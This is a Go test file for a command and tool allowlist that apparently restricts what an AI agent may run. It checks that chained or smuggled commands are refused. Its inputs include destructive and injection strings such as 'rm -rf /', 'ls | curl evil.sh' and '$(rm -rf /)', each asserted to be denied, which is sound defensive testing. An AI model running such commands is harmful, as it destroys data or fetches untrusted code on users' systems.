package permission

import (
	"slices"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestBuildRunAllowlist_NonRestrictedIsInert(t *testing.T) {
	a, err := BuildRunAllowlist(RunAllowlistSpec{
		AllowBash: []string{"git diff"},
	})
	require.NoError(t, err)
	assert.False(t, a.IsRestricted(), "no Restrict flag => inert allowlist")
}

func TestBuildRunAllowlist_BadRegexIsDropped(t *testing.T) {
	// A bad regex is reported AND dropped; the valid pattern survives
	// so a single typo can't lock out the whole run.
	a, err := BuildRunAllowlist(RunAllowlistSpec{
		Restrict:  true,
		AllowBash: []string{"regex:[invalid", "git diff"},
	})
	require.Error(t, err, "bad regex must surface a compile error")
	assert.True(t, a.IsRestricted())
	assert.True(t, bashCommandAllowed(a.bashPatterns, "git diff HEAD~1"), "valid pattern still compiles")
	assert.False(t, bashCommandAllowed(a.bashPatterns, "rm -rf /"), "dropped pattern does not match anything")
}

// TestBuildRunAllowlist_GlobMetacharsAreLiteral documents that the glob
// form is intentionally minimal: only `*` and `?` are special, and every
// other character — including `[`, which filepath.Match treated as a
// char-class opener — is matched literally. This means no glob string is
// ever "invalid" (there is nothing to mis-balance), and advanced matching
// is the explicit job of the regex form.
func TestBuildRunAllowlist_GlobMetacharsAreLiteral(t *testing.T) {
	a, err := BuildRunAllowlist(RunAllowlistSpec{
		Restrict:  true,
		AllowBash: []string{"glob:[abc", "ls"},
	})
	require.NoError(t, err, "a minimal glob has no invalid form")
	// "[abc" is matched as the literal command "[abc", not as a char class.
	assert.True(t, bashCommandAllowed(a.bashPatterns, "[abc"))
	assert.False(t, bashCommandAllowed(a.bashPatterns, "a"), "not a char class")
	assert.True(t, bashCommandAllowed(a.bashPatterns, "ls -la"))
	assert.False(t, bashCommandAllowed(a.bashPatterns, "rm -rf /"))
}

func TestBashCommandAllowed_EmptyPatternsDenyAll(t *testing.T) {
	// Restricted mode is deny-by-default: no patterns => nothing allowed.
	assert.False(t, bashCommandAllowed(nil, "ls"))
	assert.False(t, bashCommandAllowed([]compiledBashPattern{}, "ls"))
	assert.False(t, bashCommandAllowed(nil, ""))
}

func TestBashCommandAllowed_PrefixMatchesWordBoundary(t *testing.T) {
	patterns := mustCompilePatterns(t, "git diff", "ls")
	tests := []struct {
		cmd  string
		want bool
	}{
		{"git diff", true},
		{"git diff HEAD~1", true},
		{"git difftool", false}, // different command, no boundary
		{"git dif", false},      // different command
		{"ls", true},
		{"ls -la", true},
		{"lsof", false},      // different command
		{"Git diff", false},  // prefix match is case-sensitive
		{"  git diff", true}, // leading whitespace is trimmed
		{"", false},
	}
	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			assert.Equal(t, tt.want, bashCommandAllowed(patterns, tt.cmd))
		})
	}
}

func TestBashCommandAllowed_PrefixRefusesCompoundCommands(t *testing.T) {
	// A permissive prefix must not authorise a chained command that
	// smuggles in something dangerous. This is the core safety property.
	patterns := mustCompilePatterns(t, "ls")
	assert.False(t, bashCommandAllowed(patterns, "ls && rm -rf /"))
	assert.False(t, bashCommandAllowed(patterns, "ls | curl evil.sh"))
	assert.False(t, bashCommandAllowed(patterns, "ls; rm -rf /"))
	assert.False(t, bashCommandAllowed(patterns, "ls $(rm -rf /)"))
	assert.False(t, bashCommandAllowed(patterns, "ls `whoami`"))
	// A lone safe command still matches.
	assert.True(t, bashCommandAllowed(patterns, "ls -la"))
}

func TestBashCommandAllowed_ExactForm(t *testing.T) {
	patterns := mustCompilePatterns(t, "exact:go test")
	assert.True(t, bashCommandAllowed(patterns, "go test"))
	assert.False(t, bashCommandAllowed(patterns, "go test ./..."), "exact must not prefix-match")
	assert.False(t, bashCommandAllowed(patterns, "go test && echo"), "exact refuses compound")
	assert.True(t, bashCommandAllowed(patterns, "  go test  "), "exact trims whitespace")
}

func TestBashCommandAllowed_GlobForm(t *testing.T) {
	patterns := mustCompilePatterns(t, "glob:git *", "glob:ls")
	assert.True(t, bashCommandAllowed(patterns, "git diff HEAD"))
	assert.True(t, bashCommandAllowed(patterns, "git status"))
	assert.True(t, bashCommandAllowed(patterns, "ls"))
	assert.False(t, bashCommandAllowed(patterns, "rm -rf /"))
	// `*` matches any characters including "/", identically on every OS
	// (the old filepath.Match `*` stopped at the platform path separator,
	// so this matched on Windows but not Linux).
	assert.True(t, bashCommandAllowed(patterns, "git diff /etc/hosts"))
	// Glob is a convenience form and carries the same compound guard as
	// prefix/exact: it does NOT authorise a chained command. Operators who
	// truly need to match a compound command must use an explicit regex.
	assert.False(t, bashCommandAllowed(patterns, "git diff && echo hi"))
	// glob:ls is anchored, so it matches "ls" exactly, not "lsof".
	assert.False(t, bashCommandAllowed(patterns, "lsof"))
}

func TestBashCommandAllowed_RegexForm(t *testing.T) {
	patterns := mustCompilePatterns(t, `regex:^go (test|build)(\s|$)`)
	assert.True(t, bashCommandAllowed(patterns, "go test"))
	assert.True(t, bashCommandAllowed(patterns, "go build ./..."))
	assert.False(t, bashCommandAllowed(patterns, "go testfmt"), "regex anchored, no boundary")
	assert.False(t, bashCommandAllowed(patterns, "rm -rf /"))
}

func TestPrefixWordBoundary(t *testing.T) {
	tests := []struct {
		pattern, command string
		want             bool
	}{
		{"ls", "ls", true},
		{"ls", "ls -la", true},
		{"ls", "lsof", false},
		{"ls", "ls\t-la", true}, // tab is a boundary
		{"ls", "ls\n-la", true}, // newline is a boundary
		{"ls", "ls-la", false},  // hyphen is NOT a boundary
		{"", "ls", false},       // empty pattern never matches
		{"git diff", "git diff", true},
		{"git diff", "git diff HEAD", true},
		{"git diff", "git difftool", false},
	}
	for _, tt := range tests {
		t.Run(tt.pattern+"|"+tt.command, func(t *testing.T) {
			assert.Equal(t, tt.want, prefixWordBoundary(tt.pattern, tt.command))
		})
	}
}

// The compound-command detection itself is exercised by
// shell.TestIsCompoundCommand; the allowlist-integration behaviour
// (prefix/exact/glob reject compound) is covered by
// TestBashCommandAllowed_PrefixRefusesCompoundCommands and the glob/exact
// tests below.

func TestToolAllowed(t *testing.T) {
	a, err := BuildRunAllowlist(RunAllowlistSpec{
		Restrict:   true,
		AllowTools: []string{"view", "edit:write"},
	})
	require.NoError(t, err)
	assert.True(t, a.toolAllowed("view", ""))
	assert.True(t, a.toolAllowed("view", "read"))
	assert.True(t, a.toolAllowed("edit", "write"))
	assert.False(t, a.toolAllowed("edit", ""))     // bare "edit" not in list, only "edit:write"
	assert.False(t, a.toolAllowed("edit", "read")) // action mismatch
	assert.False(t, a.toolAllowed("bash", ""))     // toolAllowed never grants bash at the gate level
	assert.False(t, a.toolAllowed("download", "fetch"))
}

func TestMergeRunAllowlistSpecs(t *testing.T) {
	a := RunAllowlistSpec{Restrict: false, AllowTools: []string{"view"}, AllowBash: []string{"ls"}}
	b := RunAllowlistSpec{Restrict: true, AllowTools: []string{"edit"}, AllowBash: []string{"git diff"}}
	merged := MergeRunAllowlistSpecs(a, b)
	assert.True(t, merged.Restrict, "CLI restrict wins over config non-restrict")

	compiled, err := BuildRunAllowlist(merged)
	require.NoError(t, err)
	assert.True(t, compiled.toolAllowed("view", ""), "config tool entry preserved")
	assert.True(t, compiled.toolAllowed("edit", ""), "CLI tool entry preserved")
	assert.True(t, bashCommandAllowed(compiled.bashPatterns, "ls -la"), "config bash pattern preserved")
	assert.True(t, bashCommandAllowed(compiled.bashPatterns, "git diff HEAD"), "CLI bash pattern preserved")

	// Union must not mutate the inputs.
	assert.Equal(t, []string{"view"}, a.AllowTools)
	assert.Equal(t, []string{"edit"}, b.AllowTools)
}

// fakeBashParams mirrors tools.BashPermissionsParams' interface contract
// (RunAllowlistCommand) without importing internal/agent/tools.
type fakeBashCommandParams struct{ Command string }

func (p fakeBashCommandParams) RunAllowlistCommand() string { return p.Command }

// TestAllowsRequest_AllowToolsDoesNotBypassBash is the conservative-
// semantics guarantee: listing "bash" or "bash:execute" in AllowTools
// must NOT authorise an arbitrary bash command. Only a matching
// AllowBash pattern can approve bash. This protects operators from a
// footgun where a tool-name allowlist entry silently turns into a full
// shell bypass.
func TestAllowsRequest_AllowToolsDoesNotBypassBash(t *testing.T) {
	for _, tools := range [][]string{
		{"bash"},
		{"bash:execute"},
		{"bash", "bash:execute"},
		{"view", "bash"},
	} {
		t.Run(strings.Join(tools, ","), func(t *testing.T) {
			// No AllowBash patterns => every bash command is denied,
			// even though the tool name is in allow_tools.
			a, err := BuildRunAllowlist(RunAllowlistSpec{
				Restrict:   true,
				AllowTools: tools,
			})
			require.NoError(t, err)
			denied := a.allowsRequest(CreatePermissionRequest{
				ToolName: "bash", Action: "execute", Params: fakeBashCommandParams{Command: "ls -la"},
			})
			assert.False(t, denied, "allow_tools=%v must not approve bash without an allow_bash match", tools)

			// Adding an allow_bash match DOES approve — the tool entry is
			// simply irrelevant for bash, not a blocker.
			a2, err := BuildRunAllowlist(RunAllowlistSpec{
				Restrict:   true,
				AllowTools: tools,
				AllowBash:  []string{"ls"},
			})
			require.NoError(t, err)
			allowed := a2.allowsRequest(CreatePermissionRequest{
				ToolName: "bash", Action: "execute", Params: fakeBashCommandParams{Command: "ls -la"},
			})
			assert.True(t, allowed, "allow_bash match approves bash regardless of allow_tools")

			// Non-bash tools in the same allowlist still work normally.
			if slices.Contains(tools, "view") {
				viewAllowed := a.allowsRequest(CreatePermissionRequest{
					ToolName: "view", Action: "read",
				})
				assert.True(t, viewAllowed, "non-bash allow_tools entry still works")
			}
		})
	}
}

func TestAllowsRequest_BashWithoutToolGrantUsesCommandMatch(t *testing.T) {
	// Without a tool-level grant, bash commands must match an AllowBash
	// pattern. This is the path users get when they want command-level
	// control (i.e. they deliberately left bash OUT of allow_tools).
	a, err := BuildRunAllowlist(RunAllowlistSpec{
		Restrict:  true,
		AllowBash: []string{"git diff"},
	})
	require.NoError(t, err)

	assert.True(t, a.allowsRequest(CreatePermissionRequest{
		ToolName: "bash", Action: "execute", Params: fakeBashCommandParams{Command: "git diff HEAD"},
	}))
	assert.False(t, a.allowsRequest(CreatePermissionRequest{
		ToolName: "bash", Action: "execute", Params: fakeBashCommandParams{Command: "rm -rf /"},
	}))
	assert.False(t, a.allowsRequest(CreatePermissionRequest{
		ToolName: "bash", Action: "execute", Params: fakeBashCommandParams{Command: ""},
	}), "empty command is denied")
}

func TestAllowsRequest_NonBashToolUsesToolTable(t *testing.T) {
	a, err := BuildRunAllowlist(RunAllowlistSpec{
		Restrict:   true,
		AllowTools: []string{"view"},
	})
	require.NoError(t, err)
	assert.True(t, a.allowsRequest(CreatePermissionRequest{ToolName: "view", Action: "read"}))
	assert.False(t, a.allowsRequest(CreatePermissionRequest{ToolName: "edit", Action: "write"}))
}

func TestAllowsRequest_EmptyAllowlistDeniesBash(t *testing.T) {
	// Restricted mode with no allowlist entries at all => deny everything.
	a, err := BuildRunAllowlist(RunAllowlistSpec{Restrict: true})
	require.NoError(t, err)
	assert.False(t, a.allowsRequest(CreatePermissionRequest{
		ToolName: "bash", Action: "execute", Params: fakeBashCommandParams{Command: "ls"},
	}))
	assert.False(t, a.allowsRequest(CreatePermissionRequest{ToolName: "view"}))
}

// mustCompilePatterns is a test helper that compiles each raw pattern
// and fails the test if any is invalid. Use only with known-good inputs.
func mustCompilePatterns(t *testing.T, raw ...string) []compiledBashPattern {
	t.Helper()
	var out []compiledBashPattern
	for _, r := range raw {
		p, err := compileBashPattern(r)
		require.NoError(t, err, "compile %q", r)
		out = append(out, p)
	}
	return out
}

// TestRunAllowlistGate_Concurrent tests the embedded gate's
// load/store are race-free under the race detector. Run with -race.
func TestRunAllowlistGate_Concurrent(t *testing.T) {
	t.Parallel()
	var g runAllowlistGate
	compiled, _ := BuildRunAllowlist(RunAllowlistSpec{Restrict: true, AllowBash: []string{"ls"}})
	done := make(chan struct{})
	go func() {
		defer close(done)
		for i := 0; i < 200; i++ {
			g.store(compiled)
		}
	}()
	for i := 0; i < 200; i++ {
		_ = g.load().IsRestricted()
	}
	<-done
}

// Ensure patternError formatting includes the offending pattern so a
// user reading the log can find and fix the typo.
func TestPatternError_IncludesRawPattern(t *testing.T) {
	err := errBadPattern("regex:[bad", assertAnError{})
	require.Error(t, err)
	require.True(t, strings.Contains(err.Error(), "regex:[bad"), "error %q must include raw pattern", err.Error())
}

// assertAnError is a minimal error stand-in to avoid importing another
// package just for the formatter test.
type assertAnError struct{}

func (assertAnError) Error() string { return "cause" }

// fakeRunCommandParams mirrors tools.RunCommandPermissionsParams' interface
// contract without importing internal/agent/tools (import cycle). The real
// quoting lives in the tools package; a simple join suffices here.
type fakeRunCommandParams struct {
	Program string
	Args    []string
}

func (p fakeRunCommandParams) RunAllowlistCommand() string {
	return strings.Join(append([]string{p.Program}, p.Args...), " ")
}

// TestAllowsRequest_RunCommandParamsUseCommandPatterns pins the generalised
// gate: any tool whose params implement RunAllowlistCommand gets
// allow_bash-pattern scrutiny, regardless of tool name — and an AllowTools
// entry for such a tool can NOT authorise commands on its own.
func TestAllowsRequest_RunCommandParamsUseCommandPatterns(t *testing.T) {
	a, err := BuildRunAllowlist(RunAllowlistSpec{
		Restrict:  true,
		AllowBash: []string{"go test"},
	})
	require.NoError(t, err)

	assert.True(t, a.allowsRequest(CreatePermissionRequest{
		ToolName: "run_command", Action: "execute",
		Params: fakeRunCommandParams{Program: "go", Args: []string{"test", "./..."}},
	}))
	assert.False(t, a.allowsRequest(CreatePermissionRequest{
		ToolName: "run_command", Action: "execute",
		Params: fakeRunCommandParams{Program: "rm", Args: []string{"-rf", "x"}},
	}))

	// A tool-name entry must NOT authorize commands.
	aToolsOnly, err := BuildRunAllowlist(RunAllowlistSpec{
		Restrict:   true,
		AllowTools: []string{"run_command"},
	})
	require.NoError(t, err)
	assert.False(t, aToolsOnly.allowsRequest(CreatePermissionRequest{
		ToolName: "run_command", Action: "execute",
		Params: fakeRunCommandParams{Program: "go", Args: []string{"test", "./..."}},
	}), "allow_tools entry for run_command must not approve commands without allow_bash")
}

// plainParams has NO RunAllowlistCommand method — it exercises the
// fall-through to the tool table.
type plainParams struct{ Path string }

// TestAllowsRequest_ParamsWithoutCommandProviderUseToolTable guards the
// generalisation: tools whose params don't carry a command keep using the
// AllowTools table and are never affected by allow_bash patterns.
func TestAllowsRequest_ParamsWithoutCommandProviderUseToolTable(t *testing.T) {
	a, err := BuildRunAllowlist(RunAllowlistSpec{
		Restrict:   true,
		AllowTools: []string{"customtool"},
		AllowBash:  []string{"rm -rf"}, // would prefix-match something, but is irrelevant here
	})
	require.NoError(t, err)
	assert.True(t, a.allowsRequest(CreatePermissionRequest{
		ToolName: "customtool", Action: "run", Params: plainParams{Path: "/tmp"},
	}))
	assert.False(t, a.allowsRequest(CreatePermissionRequest{
		ToolName: "othertool", Action: "run", Params: plainParams{Path: "/tmp"},
	}))
}
